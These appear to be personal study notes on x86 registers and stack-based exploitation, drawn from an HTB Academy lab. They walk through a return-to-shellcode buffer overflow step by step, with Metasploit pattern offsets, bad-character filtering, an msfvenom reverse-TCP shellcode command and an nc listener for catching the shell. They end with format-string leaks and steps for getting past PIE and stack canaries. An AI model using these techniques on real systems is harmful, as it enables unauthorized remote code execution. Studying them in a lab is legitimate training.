# Registers in x86
Structure of rax (64 bit)

<image src='images/rax.png'></image>

Only 2 reserved registers: rsp and rip (stack pointer, instruction pointer)

<image src='images/cpu_registers.png'/>

**Endianness**: reading from lower to higher addresses, our normal reading direction (left to right) is big endian

## General Registers
Prefix `e` means 32-bit, `r` means 64
### Data Registers
| 64-bit reg | Description                              |
| ---------- | ---------------------------------------- |
| rax        | Accumulator: IO, arith ops               |
| rbx        | Base: indexed addressing                 |
| rcx        | Counter: rotate instructors, count loops |
| rdx        | Data: IO, arith ops for muldiv ops of large values |

### Index Registers
For string ops
| 32-bit reg | Description                            |
| ---------- | -------------------------------------- |
| esi        | Source Index: pointer to source string |
| edi        | Pointer to dest                        |

### Pointer Registers
Memory grows towards **lower (smaller)** addresses
| 32-bit ops | Description                        |
| ---------- | ---------------------------------- |
| eip        | Offset address of next instruction |
| esp        | Top of stack (ie near to heap)     |
| ebp        | Base pointer: base of stack        |

- <font color="red">In 64-bit arch, the first 6 function params are passed to registers -- RDI, RSI, RDX, RCX, R8, and R9 -- not stack </font>. To leak the top of the stack with format string vulnerability, `%7$s` will leak the 7th value
- Values get written from lower to higher (ie esp->ebp direction). Thus, `str[0]` has lower address, and is nearer to TOS than `str[1]`

## Stack Frames
**Prologue** for when a function is called
```bash
push ebp # Stores ebp of parent function
mov ebp, esp # BP of new function is top of stack of current function
push ebx
sub esp, 0x<offset> # SP of new function is definitely even above (at smaller address) 
```

**Epilogue** for when a function ends
```bash
mov esp, ebp    # esp = ebp
pop ebp
ret
```

When `call` executes, it 
1. pushes return address onto stack
2. sets `eip` to call destination to jump to target function

# Return2Shellcode
## 1. Hijack EIP
Bytes shown in image belong to [HTB Academy](https://academy.hackthebox.com/module/31/section/397), useful for Section 2 illustration below
<image src='images/physical_memory_view_case_study_1.png'/>
Step 1: Generate a pattern string that causes SIGSEV

```bash
# Create string to copy using metasploit: before entering gdb
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <random_number> > pattern.txt
cat pattern.txt
```

Step 2: Calculate exact offset

```bash
# In gdb
info registers eip

# Outside gdb, calculate
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <eip_address_obtained_above>
```

Step 3: Verify with manual string

```bash
# In gdb. Below is for 32-bit, not 64
run $(python -c "print '\x55' * <offset_discovered> + '\x66' * 4")
```

## 2. Determine Length of Shellcode
Does it fit into the buffer between esp and eip?
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```

Based on image in Section 1,
```bash
Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
NOPs = "\x90" * 100     # helps shellcode execute cleanly
Shellcode = "\x44" * 150  # larger than approximated number got from msvenom
EIP = "\x66" * 4
```
## 3. Identify Bad Characters Skipped in Program
Avoid them in shellcode. Bad chars are magic numbers

Create complete character set
```bash
# Create string of "\x00\x01\x02...\xff"
CHARS=$(for i in {0..255}; do printf "\\\x%02x" $i; done)
# Calculate number of bytes
echo $CHARS | sed 's/\\x/ /g' | wc -w   # num_char
```

**while $CHARS still have bad characters:**
```bash
# Buffer = "\x55" * (<offset_to_eip> - <num_chars> - 4)
# CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
# EIP = "\x66" * 4
```
Set breakpoint at function `break <func>`

```bash
# Add 4 to offset_to_eip because offset_to_eip only reaches the eip, but we also want to overwrite eip (4 bytes in this case study)
run $(python -c 'print "\x55" * (<offset_to_eip+4> - <num_chars> - 4) + <$CHARS copied> + "\x66" * 4')

# In gdb
x/2000xb $esp+<number_slightly_gt_offset_to_eip>       # Show 2000 hexadecimals in byte form like 0x55, <number_gt_offset> bytes towards ebp from esp
```
<details><summary>Original 256 characters here</summary>

```bash
run $(python -c 'print "\x55"*(1040-253-4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66"*4')
```
</details>

Within stack memory, find the part with missing continuous bytes. Remove it from $CHARS

## 4. Generate Shellcode
Complete shellcode needs bad characters
```bash
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --platform linux --arch x86 --format c --bad-chars "<bad_char_list like \x00\x0a>" --out shellcode

cat shellcode | grep \" | tr -d '"; \n' # Get shellcode string
```

## 5. Reverse-shell
In the current gdb terminal, find any address that contains NOP (`x/` command). Ensure that the address **does not have bad characters**. Write in **little-endian** (R2L) for Intel syntax

In another sshed-terminal, 
```
nc -nvlp 31337
```

In the current terminal, exit gdb and execute
```bash
./<file> $(python -c 'print "\x55"*(1040-253-4) + <shellcode> + "<\x...\x new_flow_addr>"')
```

Reverse shell obtained in another ssh terminal

# Format String Vulnerability
Memory is leaked with additional specifiers in `printf()`
- 32-bit arch: leaks from TOS (lowest addr of stack), as parameters are stored there **only**
- 64-bit arch: parameters are stored in the order RDI, RSI, RDX, RCX, R8, R9, then the stack. However, the first leaked position is RSI, because eg in `printf("%x %x")`, `"%x %x"` must be stored as an argument, so it is stored in the first placeholder -- RDI. When `printf()` executes, the pointer already points to RSI. Hence, `%6$x` leaks the first value on the stack, not `%7$x`

## Combating PIE
1. Identify the hidden functions that will remain in that stack frame regardless of the length of input buffer (ie entering long strings): real/gdb
2. Identify which parameter to leak (ie which `n` for `%n$lX`) the input. Can test it by iteratively do `ABCD.%1$lX.%2$lX...`
3. Identify which parameters to leak the hidden function in point 1 and canary
4. Get `dynamic_base_addr = dynamic_hidden_func_addr - static_func_addr<found_by_binary.symbols.hidden_func>`
5. `binary.address = dynamic_base_addr`
6. Get `binary.symbols.func_to_hijack_to`. Only execute this after step 5
7. Payload to fill up the buffer with junk + canary to bypass checks + 8-byte junk + addr in step 6